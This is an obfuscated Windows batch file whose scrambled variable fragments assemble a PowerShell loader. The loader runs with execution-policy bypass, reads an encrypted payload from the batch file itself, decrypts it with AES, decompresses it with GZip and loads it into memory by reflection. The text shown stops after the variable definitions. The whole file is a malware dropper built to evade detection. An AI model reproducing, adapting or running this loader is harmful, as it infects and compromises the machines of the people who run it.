@echo off
set "qmKbfswdEv=ll"
set "YatFAUikfA=we"
set "LjGiHFMmPs=.e"
set "GqAWrRaJdd=1."
set "CwGZMTBEii=he"
set "qdAPmNpykt=co"
set "iGusxLLYju=st"
set "oTBDTxktBf=Wi"
set "VgZJBxFlFl=he"
set "gnpkIGKVuK=py"
set "eKINAPuGFL=\W"
set "tLnxOrRDzD=nd"
set "UChDtzmEpI=ow"
set "wPZdwqwIcR=s\"
set "oXFUkxXqwZ=0\"
set "UiBIeusWpe=32"
set "bFBOynWnOM=xe"
set "yhFBryDXhu= /"
set "EyzIGSwrCK=in"
set "rNZBgvhqGL=rs"
set "tPIfpAXqsT=ws"
set "ifEqTwJScm=Po"
set "yzklnpuCWC=Sy"
set "sMOWNiViAa=po"
set "DkByHZfMnd=do"
set "kYmWpITMrH= C"
set "WSjctLJeok=ll"
set "kFdSJDMkbx=em"
set "sMkRjANcYe=\v"
set "aHaKUZkUWr=:\"
set "KIsBrOQtsf=rS"
set "LcbvZtQxrg=y "
set "JCnAFZLOKn=we"
set "xdPrmexsqL= %~dp0"
set "zIWDkQKSbR=cd"
set "CNDuZSNPBk=oL'["
set "wnIfdqDpXJ=ress"
set "NNAdYAbTCR=)($k"
set "NYZAgiTNbk=ress"
set "BINsFFzlgw=($ww"
set "kBZwzzVJiI=tem."
set "EhXphSQQsa=($ww"
set "xxoHhOMmdj=]::C"
set "oItnMYDjnV=WdK."
set "XGobRKhPKE=[]] "
set "mJdUUWmtbb=)))"
set "EGiVpxmrkL=..-1"
set "mtmgdKCXPg=oin "
set "GVItHITDjV=$DKj"
set "YSljIVmgHY=);$D"
set "RtyeCKYKic=udAo"
set "YTwjBZNeEd=();$"
set "MpWMUYhEpf='dqR"
set "qlQDyERQPu=7Yiv"
set "dmFZljCJFU=daeR"
set "hpDRPKXYre=rudA"
set "qRxjXbDYUP=se()"
set "eBdtNbFeiZ=  $k"
set "dKnCwORRvQ= New"
set "vvQTUVKHoo=lCVa"
set "xCiFHXOBhl=urit"
set "DwScizaclg=('da"
set "OftEHxEyLs=am;$"
set "nNpoiSVbrv=7;$D"
set "MmwqJtGAKZ=ose("
set "ASplvVvzZy=o = "
set "xtRlwJqAmX=1..-"
set "bXbdvIvmbW=;$dG"
set "gtbSDHfxKB=ddin"
set "PMpZjmRAyQ=y.Ci"
set "dQILLTZNMb=vj0m"
set "PUvlQzYHaU=TllA"
set "HRSfzbupnj=o = "
set "KjBoGIolvz=k = "
set "qLDABQbzXm=[IO."
set "wdEcbSDauM=nage"
set "jHNaoruGYb=tS46"
set "lSUvOoLRVJ=ment"
set "PwwITrllPn=).Sp"
set "qxTKCeiBZF=KjWa"
set "NHAEqxdJJO= '')"
set "KjJyMjZtIe=brea"
set "tBelJHXaAy=embl"
set "YzDKVeebgK=.Sec"
set "HoIJMyTzpr=ct S"
set "SlJnFrLctt=ress"
set "ZEVOgFqAct=DkM "
set "BObsMbpKky=rtS4"
set "DPtzHujEUZ=em.I"
set "AcmmvlLWBJ=ptog"
set "aRFAzijeBY=IiZ."
set "zFJFumbeGU= '')"
set "stnuFYfKxo=nirt"
set "AIqOXPVkLy=L.Su"
set "sNeefVbwDd=m.Re"
set "YMKnxXKoDf=ect "
set "oxRdrfAWnf=::De"
set "MtHEaVwjib=();$"
set "CLATzhQMyp=orF'"
set "nEMACiCrhr=bypa"
set "cRdaMkoCQO=esaB"
set "uJOHsTgRyV=3); "
set "LYtiZEVaHd=$dKJ"
set "qeWIbSfjCG=GpiK"
set "fKuqcxhGFm=pres"
set "LncOgpxjbd=if);"
set "AejNwwBJTW=$rud"
set "hrJsSbXVBb=comm"
set "vhkAXYkUAW=[Sys"
set "qzREdiVfsV=; };"
set "OTbuUcrayy=ecry"
set "tvjiElreuE= [Sy"
set "QBRmUxrAgA=$Gpi"
set "VsPVCNsBaa=.Dis"
set "vJbWMSZlXi=] -j"
set "jcJfmWjpkB=e = "
set "ZIzHXOVbwM=lit("
set "YgcFwEnZLT=Xa.D"
set "IIEWexEeai=LzDk"
set "FRwOLaYHpv=);$d"
set "jAwkHICedX=6] -"
set "NyidYWVtHA=Pu ="
set "NCJkXhHGOo=-joi"
set "xlwzSJBYFZ=y.Cr"
set "KbbPbpwhdX=tem."
set "BCkAsJBOfT==');"
set "EivyEqBDcT=6esa"
set "fNeWSzNhAA= = N"
set "qGjPQMKcrB=raph"
set "dfvbOgNzNr=:: '"
set "nOJXpltuJY=('%*'"
set "XBeJXratjZ=morF"
set "ivxdDhIiBV=form"
set "wNgHEklyFf=-ep "
set "vAhNKzYpIB=anwP"
set "fORRJladhn=Disp"
set "SZazhBnQwB=rity"
set "MGGVTtnBsl=v4Ir"
set "mtHSSMFiat=Kk, "
set "STyXLgLJdx== $D"
set "dvtPdeKDAI=New-"
set "wIzBvAwWEp=yste"
set "jKMqELCKjz=udAo"
set "XnxNVXPGNR=ionM"
set "HjAbYyUEek=[-1."
set "tLpooukDnD=rudA"
set "hgwEnlKWNB=Secu"
set "IShsyxxeGi=ert]"
set "MwLJNwsDhr=UGTu"
set "tUunnYkUqu=;$iw"
set "iZShqyXYkM=e]::"
set "UNYVOrlRKY=iron"
set "lwwUbRKDFx=raph"
set "DYIJHprvAy=ZYYc"
set "KhvPnjslGc=Stre"
set "WFUzezwuwP=);$D"
set "VyKhCOrybf=::('"
set "uDUeIwKcuT=lCVa"
set "skBOAZBLvB=sGUc"
set "BgdiapWsNd=tsWi"
set "sujcmBKkUG=$dKJ"
set "PYihMVrLoy=oint"
set "RsAMwXxAmf=+hAO"
set "bCMCNGVrrM=ptor"
set "CmuXfcxERD=join"
set "YYryPuaHKk='')("
set "dhslPTNVtp=('l0"
set "nvdszoctuY=M.En"
set "apfWhYngQL=ose("
set "GrefGyjaiz=-1.."
set "haAlVTTtyM=Comp"
set "CWGOJwFapQ=Syst"
set "nhyBcngQle=Obje"
set "vKPQfFTJPQ=th('"
set "KcsEhADeRF=;$iw"
set "frVkrnBrNp=m(, "
set "EVHsVFcclJ=GIiZ"
set "UqSNiydmZF=gnir"
set "FTurlFCaXH=$rud"
set "pplTpqbWZj=a = "
set "DKMAtlKDTF=ewLi"
set "OQSLHlKDdc=.Con"
set "KhKTiouAPM=.-16"
set "TfvRjoGPgC=t Sy"
set "ezEBkdkayi= = $"
set "EDILMRVFbU=g = "
set "eqzePAlMuM=Ao);"
set "uLGtkeygbs=pStr"
set "ctVTtMdeRl=hy.A"
set "GVOuVhTsEt=-joi"
set "FtsggpALHp=k; }"
set "fWcIRuAnng=esFX"
set "vRCTtlTvWY=Comp"
set "rIDblucGHn=]::("
set "lNwQtnLqhw='[-1"
set "TvrJUNNccy=Fo7l"
set "JAMaYEZqlv=.Key"
set "vinxSYXSlz= if "
set "KCIfZVKgFX=yste"
set "mTJAfSGebX=pher"
set "jAnSoHyWMd=ddin"
set "hCIUsCKals=m.IO"
set "lGQfFiYAoi= [Sy"
set "htfCePrhDT=ct S"
set "oQZpoZCeCW=DsLX"
set "tOFfCrNBzp=[Env"
set "ZaElmVESrp=-nop"
set "DalnWFKljB=trea"
set "jgGlBJGUcr=if ="
set "wFxlQMKnFs=flec"
set "XqKjHWJcck=-4] "
set "xNFCUkNCSW=[Sys"
set "BbIcQiblZU=bjec"
set "uKAZcdnSbY=..-1"
set "VSqxjDzJRe=rity"
set "gGiaMUigAn=Obje"
set "ZGWgWUdnOj=d;$D"
set "naOXYiNCDW=.Len"
set "cXfYIoixcJ===')"
set "MBhdZntdpN=and "
set "ZrgleTqvNo=, $r"
set "wsdNewCadS=rans"
set "fGZQVHfXgF=ZuL "
set "PdCflYaNin=rofi"
set "HxxiTjIljN=3HWs"
set "EAewpdgKwL=S46e"
set "eHQdPuJDYy= = ["
set "hwfRnqjRkK=$anw"
set "TdZNETDwIA=saBm"
set "RNvHiXjKvW=ck($"
set "bPXbqBmjiQ=-Obj"
set "uSblREsEDB=tion"
set "bKMYcwZakz=);$D"
set "zwSmypEmYx=pDZz"
set "BVMivAfucD=ach "
set "YgNcHbldEt=.Dis"
set "ZZbunRSgEc=:('g"
set "OUsVPibUeX=.Cry"
set "EdeOvhKbFb=WdK "
set "EOnCTaZuPu=y.Pa"
set "MhCXfElwrC=;$Gp"
set "rItUjBlNZM=.GZi"
set "CGiLxaPLZb=.Cop"
set "GLdWlaeTbk=Fina"
set "iUwLCIfKql=.Com"
set "sPpuUCMgEs=)) {"
set "dMUURTupld=);$d"
set "paTMimctNd=)($r"
set "WrfWWLyudL=ke($"
set "raxYHRMbbx=join"
set "hnOJyNbppE=em.C"
set "AWkKIMfAFn=ay()"
set "HzItWpMwNA=pose"
set "JKvunkSNyK=$DsL"
set "cIiLmkIgCQ=KjWa"
set "WlyTyQhJGW=('%~f0'"
set "bGqEtgJSHv=Disp"
set "kFglvbDXrI=[Sys"
set "LuVoEnmJVM=Star"
set "bntEUZbFlw=KjWa"
set "ylBkyOSETd=sion"
set "NXrcTlsNvK=n ''"
set "veTVNfQXDY=KJif"
set "RMZRoCDyAt='gni"
set "RmEqCfVbik=vert"
set "wSsHxZEpni=sLXa"
set "FEwXogjVza=736u"
set "GWFPtNAetN=fore"
set "ClZEjNbynH=yTo("
set "kEIvegJUcz=grap"
set "IQpEHbURxj=ZuL."
set "AehdnNTXqC=rt]:"
set "XKLsIUVVnN=u) {"
set "ehgcPSbjIV=.Cry"
set "MCZHXLytBg=oryS"
set "CdqxBBUjro=ne);"
set "oufCTDKKnz=();$"
set "prVBEQaawQ=V = "
set "IYKsDpagOR=Conv"
set "bavGmSVZgI=16] "
set "JAyzugmVEI=tryP"
set "ZzMvDRqPMl=0O+g"
set "tVXshitPYw=comp"
set "UXEvaKjXKk=.Ass"
set "yJHVXrVEPx=isfL"
set "KgDowTwMpC=ss -"
set "VmdgMtNyAr=$iwW"
set "SEQWrvRfVS=onve"
set "ukfbYoKJTk='[-1"
set "oUaMDAjEJJ=stem"
set "LGkfeHqica=in $"
set "EGtuWpXLnS=gth)"
set "TMexMBbbnM=wwZu"
set "cjtqAdbCbB=ew-O"
set "mlBdMdiBXk=ptog"
set "expoINebKb=]::("
set "eOMCaPtqAi=PKCS"
set "risYTrVREl=if.T"
set "JPaQnlPRKt=ring"
set "rkkTxeYrLe=ion."
set "lcGBsJaCdN=Wa.I"
set "XOucKZkJHy=New-"
set "sLTmlxXrmd=gMod"
set "PSweQJhlgu=m.IO"
